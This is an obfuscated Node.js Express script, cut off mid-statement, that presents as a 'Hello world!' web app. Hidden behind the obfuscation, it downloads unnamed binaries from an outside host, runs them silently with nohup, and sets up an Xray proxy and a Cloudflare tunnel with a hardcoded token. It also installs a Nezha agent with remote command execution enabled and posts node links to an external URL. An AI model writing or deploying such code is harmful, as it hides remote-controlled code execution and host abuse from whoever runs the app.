const _0xe58d4a=_0x2744;(function(_0x59bd4b,_0x4a6e10){const _0x3c671d=_0x2744,_0x6f6bd4=_0x59bd4b();while(!![]){try{const _0x2961ad=parseInt(_0x3c671d(0x275))/0x1+parseInt(_0x3c671d(0x261))/0x2+-parseInt(_0x3c671d(0x22f))/0x3+-parseInt(_0x3c671d(0x1a8))/0x4*(-parseInt(_0x3c671d(0x23c))/0x5)+-parseInt(_0x3c671d(0x26f))/0x6*(-parseInt(_0x3c671d(0x18b))/0x7)+parseInt(_0x3c671d(0x194))/0x8+-parseInt(_0x3c671d(0x1f9))/0x9;if(_0x2961ad===_0x4a6e10)break;else _0x6f6bd4['push'](_0x6f6bd4['shift']());}catch(_0x3cef40){_0x6f6bd4['push'](_0x6f6bd4['shift']());}}}(_0x5563,0x4e1f7));const express=require(_0xe58d4a(0x1dd)),app=express(),axios=require(_0xe58d4a(0x230)),os=require('os'),fs=require('fs'),path=require(_0xe58d4a(0x22c)),{promisify}=require(_0xe58d4a(0x203)),exec=promisify(require(_0xe58d4a(0x1d6))['exec']),{execSync}=require(_0xe58d4a(0x1d6)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x199)]||'',AUTO_ACCESS=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x18e)]||![],FILE_PATH=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x23e)]||'./tmp',SUB_PATH=process['env'][_0xe58d4a(0x251)]||_0xe58d4a(0x19b),PORT=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x1b6)]||process[_0xe58d4a(0x1b7)][_0xe58d4a(0x1fc)]||0xbb8,UUID=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x204)]||_0xe58d4a(0x1e6),NEZHA_SERVER=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x21b)]||'',NEZHA_PORT=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x1eb)]||'',NEZHA_KEY=process[_0xe58d4a(0x1b7)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x265)]||_0xe58d4a(0x20e),ARGO_AUTH=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x218)]||'eyJhIjoiYzZjYjc4NDJiZjM0NDQ3ZGRmZjUyNjAyYTE2ZDVlMWEiLCJ0IjoiZDlhMWFlMmMtMjI3Zi00MGU5LTkxNTUtMzJiN2VhZmIwOWE1IiwicyI6IlpqY3dORGhpWkRJdE56RTFNQzAwTW1ZeExXSmlZak10WW1VMk5EVXdNbU14T1dNdyJ9',ARGO_PORT=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x23b)]||0x1405,CFIP=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x1b3)]||_0xe58d4a(0x1af),CFPORT=process[_0xe58d4a(0x1b7)][_0xe58d4a(0x1bb)]||0x1bb,NAME=process['env']['NAME']||_0xe58d4a(0x20a);!fs[_0xe58d4a(0x237)](FILE_PATH)?(fs[_0xe58d4a(0x273)](FILE_PATH),console[_0xe58d4a(0x24c)](FILE_PATH+_0xe58d4a(0x1a6))):console['log'](FILE_PATH+_0xe58d4a(0x249));function generateRandomName(){const _0x7339b7=_0xe58d4a,_0x2b0bad=_0x7339b7(0x20c);let _0x21e619='';for(let _0x121ad4=0x0;_0x121ad4<0x6;_0x121ad4++){_0x21e619+=_0x2b0bad[_0x7339b7(0x19a)](Math[_0x7339b7(0x1a5)](Math[_0x7339b7(0x1f4)]()*_0x2b0bad[_0x7339b7(0x229)]));}return _0x21e619;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xe58d4a(0x1cf)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0xe58d4a(0x1cf)](FILE_PATH,webName),botPath=path[_0xe58d4a(0x1cf)](FILE_PATH,botName),subPath=path[_0xe58d4a(0x1cf)](FILE_PATH,_0xe58d4a(0x18a)),listPath=path[_0xe58d4a(0x1cf)](FILE_PATH,'list.txt'),bootLogPath=path[_0xe58d4a(0x1cf)](FILE_PATH,_0xe58d4a(0x25b)),configPath=path[_0xe58d4a(0x1cf)](FILE_PATH,_0xe58d4a(0x1fb));function deleteNodes(){const _0x48cdf6=_0xe58d4a;try{if(!UPLOAD_URL)return;if(!fs[_0x48cdf6(0x237)](subPath))return;let _0x195e92;try{_0x195e92=fs[_0x48cdf6(0x193)](subPath,'utf-8');}catch{return null;}const _0x31de3e=Buffer[_0x48cdf6(0x1ae)](_0x195e92,_0x48cdf6(0x233))[_0x48cdf6(0x266)](_0x48cdf6(0x24e)),_0x16633f=_0x31de3e[_0x48cdf6(0x215)]('\x0a')[_0x48cdf6(0x211)](_0x3f0900=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3f0900));if(_0x16633f[_0x48cdf6(0x229)]===0x0)return;const _0x2519b0={};_0x2519b0['nodes']=_0x16633f;const _0x1fd3bd={};_0x1fd3bd[_0x48cdf6(0x196)]=_0x48cdf6(0x26b);const _0x275751={};return _0x275751['headers']=_0x1fd3bd,axios['post'](UPLOAD_URL+_0x48cdf6(0x1ce),JSON[_0x48cdf6(0x222)](_0x2519b0),_0x275751)[_0x48cdf6(0x22d)](_0x82ce22=>{return null;}),null;}catch(_0x532008){return null;}}function cleanupOldFiles(){const _0x27a5e5=_0xe58d4a;try{const _0x3a5ecf=fs['readdirSync'](FILE_PATH);_0x3a5ecf[_0x27a5e5(0x1e5)](_0x205853=>{const _0x54fa84=_0x27a5e5,_0x40b020=path[_0x54fa84(0x1cf)](FILE_PATH,_0x205853);try{const _0x5f574e=fs[_0x54fa84(0x201)](_0x40b020);_0x5f574e[_0x54fa84(0x258)]()&&fs[_0x54fa84(0x23a)](_0x40b020);}catch(_0x1670f0){}});}catch(_0x1f56f9){}}app[_0xe58d4a(0x1f8)]('/',function(_0x222eea,_0xa6efc1){const _0x538fda=_0xe58d4a;_0xa6efc1[_0x538fda(0x256)]('Hello\x20world!');});async function generateConfig(){const _0x3bcbf0=_0xe58d4a,_0x2f9ae0={};_0x2f9ae0['access']=_0x3bcbf0(0x1ed),_0x2f9ae0['error']=_0x3bcbf0(0x1ed),_0x2f9ae0[_0x3bcbf0(0x24d)]=_0x3bcbf0(0x1d9);const _0x342111={};_0x342111['id']=UUID,_0x342111[_0x3bcbf0(0x1d0)]=_0x3bcbf0(0x1c1);const _0x3ea24a={};_0x3ea24a[_0x3bcbf0(0x1f2)]=0xbb9;const _0x6a3a31={};_0x6a3a31[_0x3bcbf0(0x22c)]=_0x3bcbf0(0x245),_0x6a3a31[_0x3bcbf0(0x1f2)]=0xbba;const _0x3a95da={};_0x3a95da['path']=_0x3bcbf0(0x195),_0x3a95da[_0x3bcbf0(0x1f2)]=0xbbb;const _0x27a3d2={};_0x27a3d2[_0x3bcbf0(0x22c)]=_0x3bcbf0(0x207),_0x27a3d2[_0x3bcbf0(0x1f2)]=0xbbc;const _0x2383fb={};_0x2383fb[_0x3bcbf0(0x276)]=[_0x342111],_0x2383fb[_0x3bcbf0(0x1fd)]=_0x3bcbf0(0x1d9),_0x2383fb[_0x3bcbf0(0x190)]=[_0x3ea24a,_0x6a3a31,_0x3a95da,_0x27a3d2];const _0x1f1230={};_0x1f1230[_0x3bcbf0(0x221)]=_0x3bcbf0(0x274);const _0x3c1820={};_0x3c1820['port']=ARGO_PORT,_0x3c1820['protocol']='vless',_0x3c1820[_0x3bcbf0(0x1f1)]=_0x2383fb,_0x3c1820[_0x3bcbf0(0x1e3)]=_0x1f1230;const _0x5909cf={};_0x5909cf['id']=UUID;const _0x4a52e6={};_0x4a52e6[_0x3bcbf0(0x276)]=[_0x5909cf],_0x4a52e6[_0x3bcbf0(0x1fd)]=_0x3bcbf0(0x1d9);const _0x408746={};_0x408746[_0x3bcbf0(0x221)]=_0x3bcbf0(0x274),_0x408746[_0x3bcbf0(0x267)]=_0x3bcbf0(0x1d9);const _0x120ae7={};_0x120ae7[_0x3bcbf0(0x1c3)]=0xbb9,_0x120ae7[_0x3bcbf0(0x1d8)]='127.0.0.1',_0x120ae7[_0x3bcbf0(0x197)]='vless',_0x120ae7['settings']=_0x4a52e6,_0x120ae7[_0x3bcbf0(0x1e3)]=_0x408746;const _0x588d4c={};_0x588d4c['id']=UUID,_0x588d4c[_0x3bcbf0(0x21e)]=0x0;const _0x2873d3={};_0x2873d3['clients']=[_0x588d4c],_0x2873d3[_0x3bcbf0(0x1fd)]=_0x3bcbf0(0x1d9);const _0x30e897={};_0x30e897[_0x3bcbf0(0x22c)]=_0x3bcbf0(0x245);const _0x3e619e={};_0x3e619e[_0x3bcbf0(0x221)]='ws',_0x3e619e[_0x3bcbf0(0x267)]=_0x3bcbf0(0x1d9),_0x3e619e[_0x3bcbf0(0x1de)]=_0x30e897;const _0x24a7ad={};_0x24a7ad['enabled']=!![],_0x24a7ad[_0x3bcbf0(0x217)]=[_0x3bcbf0(0x1cd),_0x3bcbf0(0x252),'quic'],_0x24a7ad[_0x3bcbf0(0x19d)]=![];const _0xe2fa65={};_0xe2fa65[_0x3bcbf0(0x1c3)]=0xbba,_0xe2fa65[_0x3bcbf0(0x1d8)]=_0x3bcbf0(0x26a),_0xe2fa65[_0x3bcbf0(0x197)]='vless',_0xe2fa65[_0x3bcbf0(0x1f1)]=_0x2873d3,_0xe2fa65[_0x3bcbf0(0x1e3)]=_0x3e619e,_0xe2fa65['sniffing']=_0x24a7ad;const _0x4f8a21={};_0x4f8a21['id']=UUID,_0x4f8a21[_0x3bcbf0(0x1b5)]=0x0;const _0x4a423e={};_0x4a423e[_0x3bcbf0(0x276)]=[_0x4f8a21];const _0xf519c8={};_0xf519c8['path']=_0x3bcbf0(0x195);const _0x5a935c={};_0x5a935c['network']='ws',_0x5a935c['wsSettings']=_0xf519c8;const _0xc893b4={};_0xc893b4[_0x3bcbf0(0x18d)]=!![],_0xc893b4[_0x3bcbf0(0x217)]=[_0x3bcbf0(0x1cd),'tls',_0x3bcbf0(0x1cc)],_0xc893b4['metadataOnly']=![];const _0x3062e6={};_0x3062e6['port']=0xbbb,_0x3062e6['listen']=_0x3bcbf0(0x26a),_0x3062e6['protocol']=_0x3bcbf0(0x21f),_0x3062e6['settings']=_0x4a423e,_0x3062e6[_0x3bcbf0(0x1e3)]=_0x5a935c,_0x3062e6[_0x3bcbf0(0x1e4)]=_0xc893b4;const _0x509a2a={};_0x509a2a[_0x3bcbf0(0x198)]=UUID;const _0x5d9da2={};_0x5d9da2['clients']=[_0x509a2a];const _0x28c38e={};_0x28c38e[_0x3bcbf0(0x22c)]='/trojan-argo';const _0x39ed6d={};_0x39ed6d['network']='ws',_0x39ed6d['security']=_0x3bcbf0(0x1d9),_0x39ed6d[_0x3bcbf0(0x1de)]=_0x28c38e;const _0xf03745={};_0xf03745[_0x3bcbf0(0x18d)]=!![],_0xf03745['destOverride']=[_0x3bcbf0(0x1cd),_0x3bcbf0(0x252),_0x3bcbf0(0x1cc)],_0xf03745[_0x3bcbf0(0x19d)]=![];const _0x32e029={};_0x32e029[_0x3bcbf0(0x1c3)]=0xbbc,_0x32e029[_0x3bcbf0(0x1d8)]=_0x3bcbf0(0x26a),_0x32e029[_0x3bcbf0(0x197)]=_0x3bcbf0(0x1ff),_0x32e029[_0x3bcbf0(0x1f1)]=_0x5d9da2,_0x32e029[_0x3bcbf0(0x1e3)]=_0x39ed6d,_0x32e029['sniffing']=_0xf03745;const _0x5bab06={};_0x5bab06[_0x3bcbf0(0x1e8)]=[_0x3bcbf0(0x1c0)];const _0x400a48={};_0x400a48[_0x3bcbf0(0x197)]=_0x3bcbf0(0x1e2),_0x400a48[_0x3bcbf0(0x235)]='direct';const _0x16c483={};_0x16c483[_0x3bcbf0(0x197)]=_0x3bcbf0(0x1be),_0x16c483[_0x3bcbf0(0x235)]=_0x3bcbf0(0x247);const _0x16aebd={};_0x16aebd['log']=_0x2f9ae0,_0x16aebd[_0x3bcbf0(0x248)]=[_0x3c1820,_0x120ae7,_0xe2fa65,_0x3062e6,_0x32e029],_0x16aebd[_0x3bcbf0(0x269)]=_0x5bab06,_0x16aebd['outbounds']=[_0x400a48,_0x16c483];const _0x1b0d86=_0x16aebd;fs[_0x3bcbf0(0x1df)](path[_0x3bcbf0(0x1cf)](FILE_PATH,_0x3bcbf0(0x1fb)),JSON[_0x3bcbf0(0x222)](_0x1b0d86,null,0x2));}function getSystemArchitecture(){const _0x10e260=_0xe58d4a,_0x3b94b4=os['arch']();return _0x3b94b4===_0x10e260(0x270)||_0x3b94b4===_0x10e260(0x1c6)||_0x3b94b4===_0x10e260(0x236)?_0x10e260(0x270):_0x10e260(0x1e0);}function _0x2744(_0x393deb,_0x4bb1b7){const _0x556348=_0x5563();return _0x2744=function(_0x2744ce,_0x2dfe72){_0x2744ce=_0x2744ce-0x18a;let _0x39b503=_0x556348[_0x2744ce];return _0x39b503;},_0x2744(_0x393deb,_0x4bb1b7);}function downloadFile(_0x582870,_0x3b2a43,_0x4bdcf7){const _0x53f26d=_0xe58d4a,_0x4b52ca=_0x582870;if(!fs[_0x53f26d(0x237)](FILE_PATH)){const _0x322898={};_0x322898[_0x53f26d(0x264)]=!![],fs[_0x53f26d(0x273)](FILE_PATH,_0x322898);}const _0x28502f=fs[_0x53f26d(0x227)](_0x4b52ca),_0x502314={};_0x502314[_0x53f26d(0x226)]=_0x53f26d(0x1f8),_0x502314['url']=_0x3b2a43,_0x502314[_0x53f26d(0x234)]=_0x53f26d(0x231),axios(_0x502314)['then'](_0xc968bd=>{const _0x5598ce=_0x53f26d;_0xc968bd[_0x5598ce(0x1da)][_0x5598ce(0x1ec)](_0x28502f),_0x28502f['on'](_0x5598ce(0x1ef),()=>{const _0x444b23=_0x5598ce;_0x28502f['close'](),console[_0x444b23(0x24c)](_0x444b23(0x20b)+path[_0x444b23(0x1c8)](_0x4b52ca)+_0x444b23(0x1ad)),_0x4bdcf7(null,_0x4b52ca);}),_0x28502f['on'](_0x5598ce(0x23f),_0x46a9e3=>{const _0x328066=_0x5598ce;fs[_0x328066(0x191)](_0x4b52ca,()=>{});const _0x221c6a=_0x328066(0x20b)+path[_0x328066(0x1c8)](_0x4b52ca)+_0x328066(0x25e)+_0x46a9e3['message'];console['error'](_0x221c6a),_0x4bdcf7(_0x221c6a);});})[_0x53f26d(0x22d)](_0x464ab7=>{const _0x20b1d7=_0x53f26d,_0x484a27=_0x20b1d7(0x20b)+path['basename'](_0x4b52ca)+_0x20b1d7(0x25e)+_0x464ab7[_0x20b1d7(0x1d1)];console['error'](_0x484a27),_0x4bdcf7(_0x484a27);});}async function downloadFilesAndRun(){const _0x5c1bb7=_0xe58d4a,_0x410dd0=getSystemArchitecture(),_0xdc079a=getFilesForArchitecture(_0x410dd0);if(_0xdc079a[_0x5c1bb7(0x229)]===0x0){console['log'](_0x5c1bb7(0x210));return;}const _0x46ddf9=_0xdc079a['map'](_0x5643d0=>{return new Promise((_0x3f83a0,_0x4a932e)=>{const _0x474348=_0x2744;downloadFile(_0x5643d0[_0x474348(0x1d7)],_0x5643d0[_0x474348(0x25d)],(_0x2045a3,_0x4c79f8)=>{_0x2045a3?_0x4a932e(_0x2045a3):_0x3f83a0(_0x4c79f8);});});});try{await Promise['all'](_0x46ddf9);}catch(_0x4b58e1){console[_0x5c1bb7(0x23f)]('Error\x20downloading\x20files:',_0x4b58e1);return;}function _0x44ff49(_0x353a1b){const _0x2d3889=_0x5c1bb7,_0x4a25c3=0x1fd;_0x353a1b[_0x2d3889(0x1e5)](_0x10d199=>{const _0x3dde0a=_0x2d3889;fs[_0x3dde0a(0x237)](_0x10d199)&&fs[_0x3dde0a(0x24b)](_0x10d199,_0x4a25c3,_0x322e61=>{const _0x582a89=_0x3dde0a;_0x322e61?console[_0x582a89(0x23f)](_0x582a89(0x220)+_0x10d199+':\x20'+_0x322e61):console['log'](_0x582a89(0x1d5)+_0x10d199+':\x20'+_0x4a25c3[_0x582a89(0x266)](0x8));});});}const _0x38522c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x44ff49(_0x38522c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x432d2b=NEZHA_SERVER[_0x5c1bb7(0x208)](':')?NEZHA_SERVER[_0x5c1bb7(0x215)](':')[_0x5c1bb7(0x209)]():'',_0x34aa07=new Set(['443',_0x5c1bb7(0x1ba),_0x5c1bb7(0x1a3),_0x5c1bb7(0x1a0),_0x5c1bb7(0x263),_0x5c1bb7(0x1c5)]),_0x552f2d=_0x34aa07['has'](_0x432d2b)?_0x5c1bb7(0x1bf):_0x5c1bb7(0x257),_0x32ec18=_0x5c1bb7(0x241)+NEZHA_KEY+_0x5c1bb7(0x1b4)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x552f2d+_0x5c1bb7(0x268)+UUID;fs[_0x5c1bb7(0x1df)](path[_0x5c1bb7(0x1cf)](FILE_PATH,_0x5c1bb7(0x1f3)),_0x32ec18);const _0x5026d7=_0x5c1bb7(0x23d)+phpPath+_0x5c1bb7(0x1bc)+FILE_PATH+_0x5c1bb7(0x200);try{await exec(_0x5026d7),console[_0x5c1bb7(0x24c)](phpName+_0x5c1bb7(0x244)),await new Promise(_0x36563c=>setTimeout(_0x36563c,0x3e8));}catch(_0x10b667){console[_0x5c1bb7(0x23f)]('php\x20running\x20error:\x20'+_0x10b667);}}else{let _0x1ad167='';const _0x4e9eb8=[_0x5c1bb7(0x1aa),_0x5c1bb7(0x1ba),_0x5c1bb7(0x1a3),_0x5c1bb7(0x1a0),'2083','2053'];_0x4e9eb8['includes'](NEZHA_PORT)&&(_0x1ad167=_0x5c1bb7(0x1f6));const _0x5b447d=_0x5c1bb7(0x23d)+npmPath+_0x5c1bb7(0x1d4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5c1bb7(0x1b9)+NEZHA_KEY+'\x20'+_0x1ad167+_0x5c1bb7(0x1ee);try{await exec(_0x5b447d),console[_0x5c1bb7(0x24c)](npmName+_0x5c1bb7(0x244)),await new Promise(_0x2626ed=>setTimeout(_0x2626ed,0x3e8));}catch(_0x2bd1c0){console[_0x5c1bb7(0x23f)](_0x5c1bb7(0x250)+_0x2bd1c0);}}}else console[_0x5c1bb7(0x24c)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4b22dd=_0x5c1bb7(0x23d)+webPath+_0x5c1bb7(0x24a)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4b22dd),console[_0x5c1bb7(0x24c)](webName+_0x5c1bb7(0x244)),await new Promise(_0x14910d=>setTimeout(_0x14910d,0x3e8));}catch(_0x9e2991){console[_0x5c1bb7(0x23f)](_0x5c1bb7(0x1c2)+_0x9e2991);}if(fs['existsSync'](botPath)){let _0x23f317;if(ARGO_AUTH[_0x5c1bb7(0x246)](/^[A-Z0-9a-z=]{120,250}$/))_0x23f317=_0x5c1bb7(0x19f)+ARGO_AUTH;else ARGO_AUTH[_0x5c1bb7(0x246)](/TunnelSecret/)?_0x23f317=_0x5c1bb7(0x21c)+FILE_PATH+'/tunnel.yml\x20run':_0x23f317=_0x5c1bb7(0x1e7)+FILE_PATH+_0x5c1bb7(0x26d)+ARGO_PORT;try{await exec(_0x5c1bb7(0x23d)+botPath+'\x20'+_0x23f317+_0x5c1bb7(0x1f5)),console[_0x5c1bb7(0x24c)](botName+_0x5c1bb7(0x244)),await new Promise(_0x54661b=>setTimeout(_0x54661b,0x7d0));}catch(_0x45f313){console[_0x5c1bb7(0x23f)]('Error\x20executing\x20command:\x20'+_0x45f313);}}await new Promise(_0x4743c7=>setTimeout(_0x4743c7,0x1388));}function getFilesForArchitecture(_0x5169f){const _0x4dcf93=_0xe58d4a;let _0x2a39f1;if(_0x5169f===_0x4dcf93(0x270)){const _0x37b77e={};_0x37b77e['fileName']=webPath,_0x37b77e[_0x4dcf93(0x25d)]=_0x4dcf93(0x1f0);const _0x409368={};_0x409368[_0x4dcf93(0x1d7)]=botPath,_0x409368[_0x4dcf93(0x25d)]=_0x4dcf93(0x232),_0x2a39f1=[_0x37b77e,_0x409368];}else{const _0x19bea5={};_0x19bea5[_0x4dcf93(0x1d7)]=webPath,_0x19bea5[_0x4dcf93(0x25d)]=_0x4dcf93(0x20d);const _0x4ffa75={};_0x4ffa75['fileName']=botPath,_0x4ffa75[_0x4dcf93(0x25d)]='https://amd64.ssss.nyc.mn/bot',_0x2a39f1=[_0x19bea5,_0x4ffa75];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xfa6206=_0x5169f===_0x4dcf93(0x270)?_0x4dcf93(0x22a):'https://amd64.ssss.nyc.mn/agent',_0x9d8e9f={};_0x9d8e9f[_0x4dcf93(0x1d7)]=npmPath,_0x9d8e9f[_0x4dcf93(0x25d)]=_0xfa6206,_0x2a39f1[_0x4dcf93(0x216)](_0x9d8e9f);}else{const _0x369cf3=_0x5169f===_0x4dcf93(0x270)?_0x4dcf93(0x1bd):_0x4dcf93(0x1cb),_0x46b769={};_0x46b769[_0x4dcf93(0x1d7)]=phpPath,_0x46b769[_0x4dcf93(0x25d)]=_0x369cf3,_0x2a39f1[_0x4dcf93(0x216)](_0x46b769);}}return _0x2a39f1;}function _0x5563(){const _0x3e6606=['Empowerment\x20success\x20for\x20','child_process','fileName','listen','none','data','push','timeout','express','wsSettings','writeFileSync','amd','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','freedom','streamSettings','sniffing','forEach','a84ae8d6-7ef0-411d-a95a-92f1e752f5ad','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','servers','country_code','status','NEZHA_PORT','pipe','/dev/null','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','finish','https://arm64.ssss.nyc.mn/web','settings','dest','config.yaml','random','\x20>/dev/null\x202>&1\x20&','--tls','https://oooo.serv00.net/add-url','get','13777299haTfgx','scy','config.json','PORT','decryption','subscription','trojan','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','statSync','\x0a\x20\x20credentials-file:\x20','util','UUID','clear','headers','/trojan-argo','includes','pop','kuan','Download\x20','abcdefghijklmnopqrstuvwxyz','https://amd64.ssss.nyc.mn/web','huw.hun94.cloudns.org','/sub.txt\x20saved\x20successfully','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','filter','set','/vmess-argo?ed=2560','ArgoDomain:','split','unshift','destOverride','ARGO_AUTH','aid','tunnel.json','NEZHA_SERVER','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','&fp=firefox&type=ws&host=','level','vmess','Empowerment\x20failed\x20for\x20','network','stringify','ARGO_DOMAIN:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','method','createWriteStream','Error\x20reading\x20boot.log:','length','https://arm64.ssss.nyc.mn/agent','\x0a\x0atrojan://','path','catch','substring','140742CMNgOB','axios','stream','https://arm64.ssss.nyc.mn/bot','base64','responseType','tag','aarch64','existsSync','countryCode','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','unlinkSync','ARGO_PORT','3655lGZOsh','nohup\x20','FILE_PATH','error','taskkill\x20/f\x20/im\x20','\x0aclient_secret:\x20','https://ipapi.co/json/','/api/add-nodes','\x20is\x20running','/vless-argo','match','block','inbounds','\x20already\x20exists','\x20-c\x20','chmod','log','loglevel','utf-8','response','npm\x20running\x20error:\x20','SUB_PATH','tls','nodes','&path=%2Fvless-argo%3Fed%3D2560#','net','send','false','isFile','org','tunnel.yml','boot.log','platform','fileUrl','\x20failed:\x20','?encryption=none&security=tls&sni=','url','701132RVhJPI','success','2083','recursive','ARGO_DOMAIN','toString','security','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','dns','127.0.0.1','application/json','http://ip-api.com/json/','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','App\x20is\x20running','27078DBvBIv','arm','\x20>\x20nul\x202>&1','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','mkdirSync','tcp','405185HAPHHS','clients','sub.txt','511ikqdUB','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','enabled','AUTO_ACCESS','Subscription\x20uploaded\x20successfully','fallbacks','unlink','&path=%2Ftrojan-argo%3Fed%3D2560#','readFileSync','3792504vNHvot','/vmess-argo','Content-Type','protocol','password','PROJECT_URL','charAt','fu258369','pkill\x20-f\x20\x22[','metadataOnly','add','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','2087','rm\x20-rf\x20','.exe\x20>\x20nul\x202>&1','2096','type','floor','\x20is\x20created','?security=tls&sni=','1852sbZqOd','http\x20server\x20is\x20running\x20on\x20port:','443','host','\x22\x20>\x20/dev/null\x202>&1','\x20successfully','from','cdns.doon.eu.org','\x0avless://','win32','\x20>/dev/null\x202>&1','CFIP','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','alterId','SERVER_PORT','env','automatic\x20access\x20task\x20added\x20successfully','\x20-p\x20','8443','CFPORT','\x20-c\x20\x22','https://arm64.ssss.nyc.mn/v1','blackhole','true','https+local://8.8.8.8/dns-query','xtls-rprx-vision','web\x20running\x20error:\x20','port','Unknown','2053','arm64','test','basename','Error\x20in\x20startserver:','post','https://amd64.ssss.nyc.mn/v1','quic','http','/api/delete-nodes','join','flow','message','Unhandled\x20error\x20in\x20startserver:','firefox','\x20-s\x20'];_0x5563=function(){return _0x3e6606;};return _0x5563();}function argoType(){const _0x327300=_0xe58d4a;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x327300(0x225));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs['writeFileSync'](path[_0x327300(0x1cf)](FILE_PATH,_0x327300(0x21a)),ARGO_AUTH);const _0x11d8e2='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x327300(0x215)]('\x22')[0xb]+_0x327300(0x202)+path[_0x327300(0x1cf)](FILE_PATH,_0x327300(0x21a))+_0x327300(0x239)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x327300(0x18c);fs[_0x327300(0x1df)](path[_0x327300(0x1cf)](FILE_PATH,_0x327300(0x25a)),_0x11d8e2);}else console[_0x327300(0x24c)](_0x327300(0x224));}async function extractDomains(){const _0xa37047=_0xe58d4a;let _0xf81c4d;if(ARGO_AUTH&&ARGO_DOMAIN)_0xf81c4d=ARGO_DOMAIN,console['log'](_0xa37047(0x223),_0xf81c4d),await _0x3fa2d0(_0xf81c4d);else try{const _0x387b1b=fs[_0xa37047(0x193)](path[_0xa37047(0x1cf)](FILE_PATH,_0xa37047(0x25b)),_0xa37047(0x24e)),_0x262d92=_0x387b1b[_0xa37047(0x215)]('\x0a'),_0x4c317a=[];_0x262d92[_0xa37047(0x1e5)](_0x15594b=>{const _0x365386=_0xa37047,_0x1d7e0c=_0x15594b[_0x365386(0x246)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1d7e0c){const _0x19aad4=_0x1d7e0c[0x1];_0x4c317a[_0x365386(0x1db)](_0x19aad4);}});if(_0x4c317a[_0xa37047(0x229)]>0x0)_0xf81c4d=_0x4c317a[0x0],console[_0xa37047(0x24c)](_0xa37047(0x214),_0xf81c4d),await _0x3fa2d0(_0xf81c4d);else{console[_0xa37047(0x24c)](_0xa37047(0x1e1)),fs[_0xa37047(0x23a)](path[_0xa37047(0x1cf)](FILE_PATH,_0xa37047(0x25b)));async function _0x3020a3(){const _0x59cd4c=_0xa37047;try{process['platform']===_0x59cd4c(0x1b1)?await exec(_0x59cd4c(0x240)+botName+_0x59cd4c(0x1a2)):await exec(_0x59cd4c(0x19c)+botName['charAt'](0x0)+']'+botName[_0x59cd4c(0x22e)](0x1)+_0x59cd4c(0x1ac));}catch(_0x46c2f6){}}_0x3020a3(),await new Promise(_0x4dfa01=>setTimeout(_0x4dfa01,0xbb8));const _0xdb5602='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xa37047(0x26d)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xdb5602+_0xa37047(0x1f5)),console[_0xa37047(0x24c)](botName+_0xa37047(0x244)),await new Promise(_0x2dad5f=>setTimeout(_0x2dad5f,0xbb8)),await extractDomains();}catch(_0x594598){console['error']('Error\x20executing\x20command:\x20'+_0x594598);}}}catch(_0x532581){console[_0xa37047(0x23f)](_0xa37047(0x228),_0x532581);}async function _0x57beba(){const _0x303963=_0xa37047;try{const _0x3bdb15={};_0x3bdb15['timeout']=0xbb8;const _0xa03080=await 